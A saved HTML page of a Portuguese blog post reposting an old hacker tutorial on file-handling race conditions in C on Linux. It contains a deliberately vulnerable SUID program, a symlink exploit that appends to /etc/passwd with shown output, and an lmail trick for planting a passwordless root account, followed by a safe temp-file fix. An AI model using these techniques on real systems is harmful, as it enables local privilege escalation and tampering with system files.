@@ -1,0 +1,670 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<!-- saved from url=(0087)http://0fx66.com/blog/linux/o-perigo-das-funcoes-que-manipulam-arquivos-race-condition/ -->
+<HTML xmlns="http://www.w3.org/1999/xhtml"><STYLE>#gview-cmenu {
+  position: absolute;
+  border: 1px solid #ccc;
+  background: #fff;
+  margin: 0;
+  padding: 0;
+  top: 0;
+  left: 0;
+  z-index: 10000;
+  list-style-type: none;
+  -webkit-box-shadow: 0 3px 5px rgba(0, 0, 0, .5);
+}
+
+#gview-cmenu:focus {
+  outline: none;
+}
+
+.gview-cmenu-item {
+  margin: 0;
+  padding: 5px 7px;
+  cursor: default;
+  font-size: 13px;
+  font-family: arial, san-serif;
+  color: #000;
+  -webkit-user-select: none;
+}
+
+.gview-cmenu-item:hover {
+  background-color: #F0F7F9;
+}
+
+.gview-cmenu-item:first-child {
+  border-bottom: 1px solid #ddd;
+}
+
+.gview-hidden {
+  display: none;
+}
+</STYLE><HEAD profile="http://gmpg.org/xfn/11"><META http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+	<META http-equiv="X-UA-Compatible" content="IE=EmulateIE7">
+
+	<TITLE>O perigo das funções que manipulam arquivos: Race condition | 0fx66</TITLE>
+	<LINK rel="alternate" type="application/rss+xml" title="RSS 2.0 - Todos os artigos" href="http://feeds2.feedburner.com/0fx66">
+	<LINK rel="alternate" type="application/rss+xml" title="RSS 2.0 - Todos os coment&aacute;rios" href="http://0fx66.com/blog/comments/feed/">
+	<LINK rel="pingback" href="http://0fx66.com/blog/xmlrpc.php">
+
+	<!-- style START -->
+	<!-- default style -->
+	<STYLE type="text/css" media="screen">@import url( http://0fx66.com/blog/wp-content/themes/inove/style.css );</STYLE>
+	<!-- for translations -->
+		<!--[if IE]>
+		<link rel="stylesheet" href="http://0fx66.com/blog/wp-content/themes/inove/ie.css" type="text/css" media="screen" />
+	<![endif]-->
+	<!-- style END -->
+
+	<!-- script START -->
+	<SCRIPT type="text/javascript" src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/base.js"></SCRIPT>
+	<SCRIPT type="text/javascript" src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/menu.js"></SCRIPT>
+	<!-- script END -->
+
+	<LINK rel="alternate" type="application/rss+xml" title="Feed de Coment&aacute;rios de 0fx66 &raquo; O perigo das fun&ccedil;&otilde;es que manipulam arquivos: Race condition" href="http://0fx66.com/blog/linux/o-perigo-das-funcoes-que-manipulam-arquivos-race-condition/feed/">
+<LINK rel="stylesheet" id="wp-pagenavi-css" href="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/pagenavi-css.css" type="text/css" media="">
+<LINK rel="stylesheet" id="sociable-front-css-css" href="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/sociable.css" type="text/css" media="">
+<LINK rel="index" title="0fx66" href="http://0fx66.com/blog">
+<LINK rel="start" title="Permiss&otilde;es de Arquivos UNIX" href="http://0fx66.com/blog/linux/permissoes-de-arquivos-unix/">
+<LINK rel="prev" title="Leis de controle da Internet: prote&ccedil;&atilde;o ou censura?" href="http://0fx66.com/blog/internet/leis-de-controle-da-internet-protecao-ou-censura/">
+<LINK rel="next" title="Entrevista com Patrick Volkerding" href="http://0fx66.com/blog/linux/entrevista-com-patrick-volkerding/">
+
+<LINK rel="canonical" href="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/O perigo das funções que manipulam arquivos  Race condition   0fx66.html">
+
+<!-- platinum seo pack 1.3.2 -->
+<META name="robots" content="index,follow,noodp,noydir">
+<META name="description" content="Este artigo descreve o conceito de race condition, e apresenta c&oacute;digos vulner&aacute;veis,forma de explora&ccedil;&atilde;o e corre&ccedil;&atilde;o da falha.">
+<META name="keywords" content="O perigo das fun&ccedil;&otilde;es que manipulam arquivos: Race condition,race condition,conceito,explora&ccedil;&atilde;o,vulnerabilidade,hacking,pentest,linux,linguagem C,Linux,Pentest,Programa&ccedil;&atilde;o">
+<LINK rel="canonical" href="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/O perigo das funções que manipulam arquivos  Race condition   0fx66.html">
+<!-- /platinum one seo pack -->
+	<STYLE type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</STYLE>
+</HEAD><BODY>
+<!-- wrap START -->
+<DIV id="wrap">
+
+<!-- container START -->
+<DIV id="container">
+
+<!-- header START -->
+<DIV id="header">
+
+	<!-- banner START -->
+		<!-- banner END -->
+
+	<DIV id="caption">
+		<H1 id="title"><A href="http://0fx66.com/blog/">0fx66</A></H1>
+		<DIV id="tagline">Eventos, Hardware, Internet, Linux, Notícias, Programação, Redes</DIV>
+	</DIV>
+
+	<DIV class="fixed"></DIV>
+</DIV>
+<!-- header END -->
+
+<!-- navigation START -->
+<DIV id="navigation">
+	<!-- menus START -->
+	<UL id="menus">
+		<LI class="page_item"><A class="home" title="P&aacute;gina Inicial" href="http://0fx66.com/blog/">Página Inicial</A></LI>
+		<LI class="page_item page-item-56"><A href="http://0fx66.com/blog/quem-eu-sou/" title="Sobre o Blog.">Sobre o Blog.</A></LI>
+		<LI><A class="lastmenu" href="javascript:void(0);"></A></LI>
+	</UL>
+	<!-- menus END -->
+
+	<!-- searchbox START -->
+	<DIV id="searchbox">
+					<FORM action="http://www.google.com/cse" method="get">
+				<DIV class="content">
+					<INPUT type="text" class="textfield" name="q" size="24">
+					<INPUT type="submit" class="button" name="sa" value="">
+					<INPUT type="hidden" name="cx" value="014423867591357335265:b14iidn3gqm">
+					<INPUT type="hidden" name="ie" value="UTF-8">
+				</DIV>
+			</FORM>
+			</DIV>
+<SCRIPT type="text/javascript">
+//<![CDATA[
+	var searchbox = MGJS.$("searchbox");
+	var searchtxt = MGJS.getElementsByClassName("textfield", "input", searchbox)[0];
+	var searchbtn = MGJS.getElementsByClassName("button", "input", searchbox)[0];
+	var tiptext = "Type text to search here...";
+	if(searchtxt.value == "" || searchtxt.value == tiptext) {
+		searchtxt.className += " searchtip";
+		searchtxt.value = tiptext;
+	}
+	searchtxt.onfocus = function(e) {
+		if(searchtxt.value == tiptext) {
+			searchtxt.value = "";
+			searchtxt.className = searchtxt.className.replace(" searchtip", "");
+		}
+	}
+	searchtxt.onblur = function(e) {
+		if(searchtxt.value == "") {
+			searchtxt.className += " searchtip";
+			searchtxt.value = tiptext;
+		}
+	}
+	searchbtn.onclick = function(e) {
+		if(searchtxt.value == "" || searchtxt.value == tiptext) {
+			return false;
+		}
+	}
+//]]>
+</SCRIPT>
+	<!-- searchbox END -->
+
+	<DIV class="fixed"></DIV>
+</DIV>
+<!-- navigation END -->
+
+<!-- content START -->
+<DIV id="content">
+
+	<!-- main START -->
+	<DIV id="main">
+
+
+	<DIV id="postpath">
+		<A title="Ir para a p&aacute;gina inicial" href="http://0fx66.com/blog/">Página Inicial</A>
+		 &gt; <A href="http://0fx66.com/blog/category/linux/" title="Ver todos os posts em Linux" rel="category tag">Linux</A>		 &gt; O perigo das funções que manipulam arquivos: Race condition	</DIV>
+
+	<DIV class="post" id="post-2654">
+		<H2>O perigo das funções que manipulam arquivos: Race condition</H2>
+		<DIV class="info">
+			<SPAN class="date">23, Fevereiro, 2010</SPAN>
+													<SPAN class="addcomment"><A href="http://0fx66.com/blog/linux/o-perigo-das-funcoes-que-manipulam-arquivos-race-condition/#respond">Escrever um comentário</A></SPAN>
+				<SPAN class="comments"><A href="http://0fx66.com/blog/linux/o-perigo-das-funcoes-que-manipulam-arquivos-race-condition/#comments">Ver comentários</A></SPAN>
+						<DIV class="fixed"></DIV>
+		</DIV>
+		<DIV class="content">
+			<P style="text-align: center;"><CODE>####################################################<BR>
+################ Unsekurity Scene ##################<BR>
+#########http://unsekurity.vitualave.net############<BR>
+####################################################<BR>
+</CODE></P>
+<P><STRONG>Desenvolvido por Hophet hophet@yahoo.com.br</STRONG><BR>
+Este e outros txts podem ser obtidos em: http://unsekurity.virtualave.net (link não offline mais =/)</P>
+<P style="text-align: center;"><CODE><BR>
+###############################################<BR>
+############## Race Condition #################<BR>
+#######  Funções que manipulam arquivos  ########<BR>
+###############################################<BR>
+</CODE></P>
+<P><STRONG><BR>
+* Índice:<BR>
+———</STRONG></P>
+<P><STRONG>1 – Introdução.<BR>
+2 – Condições não Atômicas – Conceito.<BR>
+3 – Explorando – Pratica.<BR>
+4 – Consertando Tudo.<BR>
+5 – Ultimas Palavras.<BR>
+6 – Links.</STRONG></P>
+<P><STRONG><BR>
+1 – Introdução<BR>
+————–<BR>
+</STRONG></P>
+<P>PS.: Todos os testes foram feitos em um Slackware 7.0 kernel 2.2.13, 2.2.18.</P>
+<P>Fala Pessoal, mais uma vez aqui estou eu trazendo mais informações a respeito de “race conditions” pra comunidade fuçadora, o objetivo é documentar mais esta técnica tao pouco falada e aplicada. Espero que o pessoal venha usar as informações aqui contidas pra crescer em conhecimento e também aumentar um pouco mais a visão do fuçador nos possíveis esquemas, utilizando tal técnica. O problema mais uma vez acontece com a mau programação onde desenvolvedores de softwares não se preocupam com a segurança de suas aplicações e a partir daí surgem explorações diversas, mas pra frente veremos onde entra isso.</P>
+<P>Se pode definir uma condição de Corrida(race condition) como um “Comportamento anomalito devido a uma dependência excessiva no tempo relativo transcorrido entre diferentes eventos”(tradução de Free On-line Dictionary of Computing). Estes eventos podem ser desde funções que abram um arquivo, também suas permissões, etc, ate a relação de valor de alguma variável compartilhada por 2 processo,como já foi dito antes.</P>
+<P><SPAN id="more-2654"></SPAN></P>
+<P><STRONG>2 – Condições não atômicas – Conceito<BR>
+————————————-</STRONG></P>
+<P>As  condições não atômicas ocorrem quando não se pode assegurar que uma operação e a seguinte vão ocorrer de maneira seguida no processador. Isto ocorre quando depois da primeira operação, o processador assina um intervalo de tempo a outro processo (fundamento da multitarefa em sistemas mono processador). Este é um exemplo de programa que contem um Race condition em funções que manipulam arquivos:</P>
+<P><CODE>#include &lt;stdio.h&gt;<BR>
+#include &lt;stdlib.h&gt;<BR>
+#include &lt;sys/stat.h&gt;<BR>
+#include &lt;unistd.h&gt;</CODE></P>
+<P><CODE>#define	ARQUIVO	"/tmp/pol"</CODE></P>
+<P><CODE>int main(void)<BR>
+{<BR>
+FILE *fd;<BR>
+struct stat estado, estado2;</CODE></P>
+<P><CODE>if (access(ARQUIVO, F_OK) &lt; 0)<BR>
+{<BR>
+fprintf(stderr,"O arquivo nao existe, criando-o...\n");<BR>
+fd = fopen(ARQUIVO,"a");<BR>
+fprintf(fd, "Eh a primeira vez que se cria o arquivo.\n");<BR>
+}<BR>
+else<BR>
+{<BR>
+fprintf(stdout,"O arquivo ja existe:\n");<BR>
+fprintf(stdout,"Adicionando caracteres ao final!\n");</CODE></P>
+<P><CODE>fd = fopen(ARQUIVO,"r+");<BR>
+if (lstat(ARQUIVO, &amp;estado2) == -1)<BR>
+{<BR>
+perror("lstat");<BR>
+exit(-1);<BR>
+}<BR>
+if (S_ISLNK(estado.st_mode))<BR>
+{<BR>
+fprintf(stdout,"Race condition conseguido\n");<BR>
+}<BR>
+fseek(fd, 0, SEEK_END);<BR>
+fprintf(fd,"Ola Fucadores!\n");<BR>
+}<BR>
+fclose(fd);<BR>
+return(0);<BR>
+}</CODE></P>
+<P>Compile este programa como root e sete o bit SUID root para nossos testes:<BR>
+<CODE><BR>
+sh-2.03# gcc race_vuln.c -o race_vuln<BR>
+sh-2.03# chmod +s race_vuln<BR>
+</CODE></P>
+<P>O que este programa, basicamente, faz é:</P>
+<OL>
+<LI> Comprovar a existência do arquivo “pol” no diretório /tmp.</LI>
+<LI> Se não existe, ele cria e escreve uma notificação conforme é a primeira vez que se escreve no arquivo.</LI>
+<LI>Se existe, abre o arquivo e escreve “Ola Fuçadores!”.</LI>
+</OL>
+<P>Além disso, é adicionado um fragmento de código que comprove se foi produzido uma race condition ou não. (Isto é irrelevante para demonstrar como ocorre realmente).</P>
+<P>Estas operações são muito comuns em quase todos os programas existentes. Mas que ocorreria se depois de comprovar a existência do arquivo com a chamada de sistema access() e justo antes de abri-lo com fopen(), outro programa interferisse e tomasse o arquivo por um link simbólico?</P>
+<P>Como podemos  imaginar, o programa, efetivamente abriria /tmp/pol,porem ele seria um link, realmente estaria operando sobre o arquivo a que ele aponta, pelo que adicionaria dados ao final do mesmo. Este fato pode permitir criar novos arquivos ou alterar os já existentes. Com isso podemos imaginar muitas coisas possíveis e realmente são muitas.</P>
+<P><STRONG><BR>
+3 – Explorando – Pratica<BR>
+————————</STRONG></P>
+<P>O método mais simples, sim não é o mais “claro”, de demonstrar este erro de programação é fazer executar em um loop o programa vulnerável e varias ordens que permitirão tomar o arquivo que se escreve a outro de seu enlace(link).</P>
+<P>Aqui vai um simples exploit que vai realizar o trabalho pra gente, mais isto poderia ser feito “na unha”. O que ele faz eh 1o remover qualquer arquivo “pol” do /tmp, criar um link simbólico pra “/etc/passwd” com o nome de “pol” e rodar o nosso programa vulnerável, assim ele ao invés de escrever em /tmp/pol ele ira escrever no /etc/passwd. Não esqueça de fazer um backup do “/etc/passwd” antes de tentar isso.<BR>
+<CODE><BR>
+#include &lt;stdio.h&gt;<BR>
+#include &lt;stdlib.h&gt;<BR>
+#include &lt;sys/stat.h&gt;<BR>
+#include &lt;unistd.h&gt;</CODE></P>
+<P><CODE>int main(int argc, char **argv)<BR>
+{</CODE></P>
+<P><CODE> if (argc &lt; 2)<BR>
+{<BR>
+fprintf(stderr,"Use: %s<BR>
+\n",argv[0]);<BR>
+exit(-1);<BR>
+}</CODE></P>
+<P><CODE> while (1)<BR>
+{<BR>
+system("rm -rf /tmp/pol;ln -s /etc/passwd pol");<BR>
+system(argv[1]);<BR>
+break;<BR>
+}</CODE></P>
+<P><CODE> return(0);<BR>
+}</CODE></P>
+<P>Agora vamos aplicar o exploit em cima do “race_vuln”:</P>
+<P>Veja:</P>
+<P><CODE>sh-2.03$ ls -l<BR>
+-rwsr-sr-x   1 root     root        15553 Jul  8 05:09 race_vuln<BR>
+-rw-r--r--   1 hophet   users         808 Jul  8 04:06 race_vuln.c<BR>
+-rwxr-xr-x   1 hophet   users       12112 Jul  8 04:08 exploit<BR>
+-rw-r--r--   1 hophet   users         329 Jul  8 04:08 exploit.c</CODE></P>
+<P><CODE>sh-2.03$ ./exploit race_vuln</CODE></P>
+<P>O arquivo já existe: Adicionando caracteres ao final. Pronto, rodamos o nosso exploit em cima do programa vulnerável, agora vamos ver o que aconteceu com o /etc/passwd.</P>
+<P>Veja:</P>
+<P><CODE>sh-2.03$ cat /tmp/pol<BR>
+root:x:0:0::/root:/bin/bash<BR>
+bin:x:1:1:bin:/bin:<BR>
+daemon:x:2:2:daemon:/sbin:<BR>
+adm:x:3:4:adm:/var/log:<BR>
+lp:x:4:7:lp:/var/spool/lpd:<BR>
+sync:x:5:0:sync:/sbin:/bin/sync<BR>
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<BR>
+halt:x:7:0:halt:/sbin:/sbin/halt<BR>
+mail:x:8:12:mail:/var/spool/mail:<BR>
+news:x:9:13:news:/usr/lib/news:<BR>
+uucp:x:10:14:uucp:/var/spool/uucppublic:<BR>
+operator:x:11:0:operator:/root:/bin/bash<BR>
+games:x:12:100:games:/usr/games:<BR>
+ftp:x:14:1::/home/ftp:/bin/bash<BR>
+gdm:x:42:42:GDM:/var/state/gdm:/bin/bash<BR>
+nobody:x:99:99:nobody:/:<BR>
+hophet:x:1000:100:Hophet,,,:/home/hophet:/bin/bash<BR>
+crist:x:1001:100::/home/crist:/bin/bash<BR>
+cairo:x:1002:100:,,,:/home/cairo:/bin/bash<BR>
+mp3:x:777:777:mp3 player:/home/mp3:/bin/bash<BR>
+pol:x:1003:100:Pol Meyen,,,:/home/pol:/bin/bash<BR>
+Ola Fucadores!</CODE></P>
+<P><CODE>sh-2.03$ cat /etc/passwd<BR>
+root:x:0:0::/root:/bin/bash<BR>
+bin:x:1:1:bin:/bin:<BR>
+daemon:x:2:2:daemon:/sbin:<BR>
+adm:x:3:4:adm:/var/log:<BR>
+lp:x:4:7:lp:/var/spool/lpd:<BR>
+sync:x:5:0:sync:/sbin:/bin/sync<BR>
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown<BR>
+halt:x:7:0:halt:/sbin:/sbin/halt<BR>
+mail:x:8:12:mail:/var/spool/mail:<BR>
+news:x:9:13:news:/usr/lib/news:<BR>
+uucp:x:10:14:uucp:/var/spool/uucppublic:<BR>
+operator:x:11:0:operator:/root:/bin/bash<BR>
+games:x:12:100:games:/usr/games:<BR>
+ftp:x:14:1::/home/ftp:/bin/bash<BR>
+gdm:x:42:42:GDM:/var/state/gdm:/bin/bash<BR>
+nobody:x:99:99:nobody:/:<BR>
+hophet:x:1000:100:Hophet,,,:/home/hophet:/bin/bash<BR>
+crist:x:1001:100::/home/crist:/bin/bash<BR>
+cairo:x:1002:100:,,,:/home/cairo:/bin/bash<BR>
+mp3:x:777:777:mp3 player:/home/mp3:/bin/bash<BR>
+pol:x:1003:100:Pol Meyen,,,:/home/pol:/bin/bash<BR>
+Ola Fucadores!</CODE></P>
+<P>Veja,funciona, o programa escreveu realmente dentro do “/etc/passwd”. Vemos que com isso podemos realmente modificar qualquer arquivo dentro do sistema. O programa vulnerável acima foi apenas um exemplo pra mostra-lhes como funciona, mas existem programas onde nos podemos manipular a saída pra os arquivos temporários, assim poderíamos colocar no “passwd” uma conta “root” realmente. Isso acontece com o agente de email “lmail” que só roda com o bit SUID e cria temporários no /tmp onde nos podemos manipular a saída pra o “/etc/passwd”, vejamos rapidamente um pouco sobre ele.</P>
+<P>Veja:</P>
+<P><CODE>sh-2.03$ ls -l `which lmail`<BR>
+-rws--x--x   1 root     root         9220 Nov 25  1993 /usr/bin/lmail*</CODE><BR>
+<CODE><BR>
+sh-2.03$ echo `perl -e 'print "\n"'`pol::0:0::/root:/bin/bash | lmail -f<BR>
+lmail: write failed to temp file /tmp/lmail29856</CODE><BR>
+<CODE><BR>
+sh-2.03$ cat /tmp/lmail29856<BR>
+pol::0:0::/root:/bin/bash</CODE></P>
+<P>Como viram, agora era só criar o link simbólico pra “/etc/passwd” com o nome acima(/tmp/lmail29856) e a conta root”pol::0:0:/root:/bin/bash” estaria la dentro do “/etc/passwd”. É, isso realmente é útil e podemos com isso fazer muitas e muitas coisas dentro do sistema, basta colocar a cabeça pra pensar e tudo se abrira a você). Poderíamos criar ou modificar serviços, acrescentar contas como foi demonstrado, modificar log’s, entre muitas outras coisas. Existem muitos programas vulneráveis a isso basta correr um pouco atrás e ler uns fontes que você acha um tanto.</P>
+<P><STRONG><BR>
+4 – Concertando Tudo.<BR>
+———————</STRONG></P>
+<P>Como o problema é um erro de programação, não é muito complicado resolve-lo, basta que os programadores ou fuçadores ao criar seus programas tenham atenção com sua estrutura e com a manipulação de arquivos, “setanto” permissões,etc. Uma das melhores soluções para este problema é o código seguinte:</P>
+<P><CODE>char *filename;<BR>
+int fd;</CODE></P>
+<P><CODE>do {<BR>
+filename = tempnam (NULL, "foo");<BR>
+fd = open (filename, O_CREAT | O_EXCL | O_TRUNC | O_RDWR, 0600);<BR>
+free(filename);<BR>
+} while (fd == -1);<BR>
+</CODE></P>
+<P>Este fragmento de código intenta criar um arquivo com um nome temporal único em um loop, ate que ele consegue. Tao simples, como útil e seguro. Basta adicionar este código ao “race_vuln.c” e aplicar as devidas mudanças que ele deixa de ser vulnerável a Race Condition, o mesmo pode ser feito com outros programas com o mesmo problema. É uma questão de atenção e cuidado.<BR>
+<STRONG><BR>
+5 – Ultimas Palavras.<BR>
+———————</STRONG></P>
+<P>Como viram “Race Condition” é muito poderoso e vale a pena pra um fuçador dominar tal “técnica” pois aumenta bastante a visão do mesmo, e com certeza é e vai ser muito útil aos fuçadores. Temos vários casos de RC e com o tempo eles serão aperfeiçoados e aplicados com mais poder e controle. Nosso caminho eh lento e difícil e estamos nele pra chegar ao fim(existe o fim??!:) sempre lutando pela busca a “informação”. É, vou ficando por aqui com minhas humildes palavras, espero ter contribuído mais uma vez para o crescimento da comunidade fuçadora. Um abraco a todo o pessoal da Unsekurity Scene a Martini, Blood_Sucker, eSc2, Martin Fallon, e a todos que tem contribuído para o crescimento do hacking verdadeiro.</P>
+<P><STRONG>6 – Links.<BR>
+———-</STRONG></P>
+<P>lmail</P>
+<P>http://hophet.hobbiton.org/lmail.tar.gz</P>
+<P>Hp pessoal</P>
+<P>http://hophet.hobbiton.org</P>
+<P>SecurityFocus</P>
+<P>http://www.securityfocus.org</P>
+<P>Um abraco.</P>
+<P>Hophet vulgo Pol Meyen.</P>
+<P>——————————– EOF ———————————</P>
+<P><STRONG>Outros links:</STRONG></P>
+<P><A href="http://en.wikipedia.org/wiki/Race_condition" target="_blank">http://en.wikipedia.org/wiki/Race_condition</A><BR>
+<A href="http://www.vivaolinux.com.br/artigo/Race-condition-vulnerabilidades-em-suids" target="_blank">http://www.vivaolinux.com.br/artigo/Race-condition-vulnerabilidades-em-suids</A><BR>
+<A href="http://www.freebsd.org/doc/en/books/developers-handbook/secure-race-conditions.html" target="_blank">http://www.freebsd.org/doc/en/books/developers-handbook/secure-race-conditions.html</A><BR>
+<A href="http://hackproofing.blogspot.com/2009/01/race-condition.html" target="_blank">http://hackproofing.blogspot.com/2009/01/race-condition.html</A><BR>
+<A href="http://support.microsoft.com/kb/317723" target="_blank">http://support.microsoft.com/kb/317723</A></P>
+<P>[]’s</P>
+
+<DIV class="sociable">
+<DIV class="sociable_tagline">
+<STRONG>Compartilhe:</STRONG>
+</DIV>
+<UL>
+	<LI class="sociablefirst"><A rel="nofollow" target="_blank" href="http://twitter.com/home?status=O%20perigo%20das%20fun%C3%A7%C3%B5es%20que%20manipulam%20arquivos%3A%20Race%20condition%20-%20http%3A%2F%2F0fx66.com%2Fblog%2Flinux%2Fo-perigo-das-funcoes-que-manipulam-arquivos-race-condition%2F" title="Twitter"><IMG src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/twitter.png" title="Twitter" alt="Twitter"></A></LI>
+	<LI><A rel="nofollow" target="_blank" href="http://delicious.com/post?url=http%3A%2F%2F0fx66.com%2Fblog%2Flinux%2Fo-perigo-das-funcoes-que-manipulam-arquivos-race-condition%2F&title=O%20perigo%20das%20fun%C3%A7%C3%B5es%20que%20manipulam%20arquivos%3A%20Race%20condition&notes=Este%20artigo%20descreve%20o%20conceito%20de%20race%20condition%2C%20e%20apresenta%20c%C3%B3digos%20vulner%C3%A1veis%2Cforma%20de%20explora%C3%A7%C3%A3o%20e%20corre%C3%A7%C3%A3o%20da%20falha." title="del.icio.us"><IMG src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/delicious.png" title="del.icio.us" alt="del.icio.us"></A></LI>
+	<LI><A rel="nofollow" target="_blank" href="http://www.facebook.com/share.php?u=http%3A%2F%2F0fx66.com%2Fblog%2Flinux%2Fo-perigo-das-funcoes-que-manipulam-arquivos-race-condition%2F&t=O%20perigo%20das%20fun%C3%A7%C3%B5es%20que%20manipulam%20arquivos%3A%20Race%20condition" title="Facebook"><IMG src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/facebook.png" title="Facebook" alt="Facebook"></A></LI>
+	<LI><A rel="nofollow" target="_blank" href="http://www.google.com/bookmarks/mark?op=edit&bkmk=http%3A%2F%2F0fx66.com%2Fblog%2Flinux%2Fo-perigo-das-funcoes-que-manipulam-arquivos-race-condition%2F&title=O%20perigo%20das%20fun%C3%A7%C3%B5es%20que%20manipulam%20arquivos%3A%20Race%20condition&annotation=Este%20artigo%20descreve%20o%20conceito%20de%20race%20condition%2C%20e%20apresenta%20c%C3%B3digos%20vulner%C3%A1veis%2Cforma%20de%20explora%C3%A7%C3%A3o%20e%20corre%C3%A7%C3%A3o%20da%20falha." title="Google Bookmarks"><IMG src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/googlebookmark.png" title="Google Bookmarks" alt="Google Bookmarks"></A></LI>
+	<LI><A rel="nofollow" target="_blank" href="http://technorati.com/faves?add=http%3A%2F%2F0fx66.com%2Fblog%2Flinux%2Fo-perigo-das-funcoes-que-manipulam-arquivos-race-condition%2F" title="Technorati"><IMG src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/technorati.png" title="Technorati" alt="Technorati"></A></LI>
+	<LI><A rel="nofollow" target="_blank" href="http://rec6.via6.com/link.php?url=http%3A%2F%2F0fx66.com%2Fblog%2Flinux%2Fo-perigo-das-funcoes-que-manipulam-arquivos-race-condition%2F&=O%20perigo%20das%20fun%C3%A7%C3%B5es%20que%20manipulam%20arquivos%3A%20Race%20condition" title="Rec6"><IMG src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/rec6.png" title="Rec6" alt="Rec6"></A></LI>
+	<LI><A rel="nofollow" target="_blank" href="http://slashdot.org/bookmark.pl?title=O%20perigo%20das%20fun%C3%A7%C3%B5es%20que%20manipulam%20arquivos%3A%20Race%20condition&url=http%3A%2F%2F0fx66.com%2Fblog%2Flinux%2Fo-perigo-das-funcoes-que-manipulam-arquivos-race-condition%2F" title="Slashdot"><IMG src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/slashdot.png" title="Slashdot" alt="Slashdot"></A></LI>
+	<LI><A rel="nofollow" target="_blank" href="http://www.friendfeed.com/share?title=O%20perigo%20das%20fun%C3%A7%C3%B5es%20que%20manipulam%20arquivos%3A%20Race%20condition&link=http%3A%2F%2F0fx66.com%2Fblog%2Flinux%2Fo-perigo-das-funcoes-que-manipulam-arquivos-race-condition%2F" title="FriendFeed"><IMG src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/friendfeed.png" title="FriendFeed" alt="FriendFeed"></A></LI>
+	<LI><A rel="nofollow" target="_blank" href="http://digg.com/submit?phase=2&url=http%3A%2F%2F0fx66.com%2Fblog%2Flinux%2Fo-perigo-das-funcoes-que-manipulam-arquivos-race-condition%2F&title=O%20perigo%20das%20fun%C3%A7%C3%B5es%20que%20manipulam%20arquivos%3A%20Race%20condition&bodytext=Este%20artigo%20descreve%20o%20conceito%20de%20race%20condition%2C%20e%20apresenta%20c%C3%B3digos%20vulner%C3%A1veis%2Cforma%20de%20explora%C3%A7%C3%A3o%20e%20corre%C3%A7%C3%A3o%20da%20falha." title="Digg"><IMG src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/digg.png" title="Digg" alt="Digg"></A></LI>
+	<LI><A rel="nofollow" target="_blank" href="http://www.printfriendly.com/print?url=http%3A%2F%2F0fx66.com%2Fblog%2Flinux%2Fo-perigo-das-funcoes-que-manipulam-arquivos-race-condition%2F&partner=sociable" title="Print"><IMG src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/printfriendly.png" title="Print" alt="Print"></A></LI>
+	<LI><A rel="nofollow" target="_blank" href="http://www.printfriendly.com/print?url=http%3A%2F%2F0fx66.com%2Fblog%2Flinux%2Fo-perigo-das-funcoes-que-manipulam-arquivos-race-condition%2F&partner=sociable" title="PDF"><IMG src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/pdf.png" title="PDF" alt="PDF"></A></LI>
+	<LI class="sociablelast"><A rel="nofollow" target="_blank" href="mailto:?subject=O%20perigo%20das%20fun%C3%A7%C3%B5es%20que%20manipulam%20arquivos%3A%20Race%20condition&body=http%3A%2F%2F0fx66.com%2Fblog%2Flinux%2Fo-perigo-das-funcoes-que-manipulam-arquivos-race-condition%2F" title="email"><IMG src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/email_link.png" title="email" alt="email"></A></LI>
+</UL>
+</DIV>
+			<DIV class="fixed"></DIV>
+		</DIV>
+		<DIV class="under">
+			<SPAN class="categories">Categories: </SPAN><SPAN><A href="http://0fx66.com/blog/category/linux/" title="Ver todos os posts em Linux" rel="category tag">Linux</A></SPAN>			<SPAN class="tags">Tags: </SPAN><SPAN><A href="http://0fx66.com/blog/tag/linux/" rel="tag">Linux</A>, <A href="http://0fx66.com/blog/tag/pentest/" rel="tag">Pentest</A>, <A href="http://0fx66.com/blog/tag/programacao/" rel="tag">Programação</A>, <A href="http://0fx66.com/blog/tag/race-condition/" rel="tag">race condition</A></SPAN>		</DIV>
+	</DIV>
+
+	<!-- related posts START -->
+	<DIV id="related_posts"><H3 class="related_post_title">Textos Relacionados:</H3><UL class="related_post"><LI><A href="http://0fx66.com/blog/linux/desenvolvimento-de-bibliotecas/" title="Desenvolvimento de Bibliotecas">Desenvolvimento de Bibliotecas</A></LI><LI><A href="http://0fx66.com/blog/pentest/ferramentaintensivedos/" title="[Ferramenta]IntensiveDos">[Ferramenta]IntensiveDos</A></LI><LI><A href="http://0fx66.com/blog/programacao/introducao-a-plataforma-gnu-de-desenvolvimento/" title="Introdu&ccedil;&atilde;o &agrave; plataforma GNU de desenvolvimento">Introdução à plataforma GNU de desenvolvimento</A></LI><LI><A href="http://0fx66.com/blog/linux/conhecendo-o-tcpdump/" title="Conhecendo o Tcpdump">Conhecendo o Tcpdump</A></LI><LI><A href="http://0fx66.com/blog/humor/e-assim-que-se-bota-o-filho-para-dormir/" title="E assim que se bota o filho para dormir">E assim que se bota o filho para dormir</A></LI></UL></DIV><DIV class="fixed"></DIV>	<!-- related posts END -->
+
+	<SCRIPT type="text/javascript" src="./O perigo das funções que manipulam arquivos  Race condition   0fx66_files/comment.js"></SCRIPT>
+
+
+
+<DIV id="comments">
+
+<DIV id="cmtswitcher">
+			<A id="commenttab" class="curtab" href="javascript:void(0);" onclick="MGJS.switchTab(&#39;thecomments,commentnavi&#39;, &#39;thetrackbacks&#39;, &#39;commenttab&#39;, &#39;curtab&#39;, &#39;trackbacktab&#39;, &#39;tab&#39;);">Comentários (0)</A>
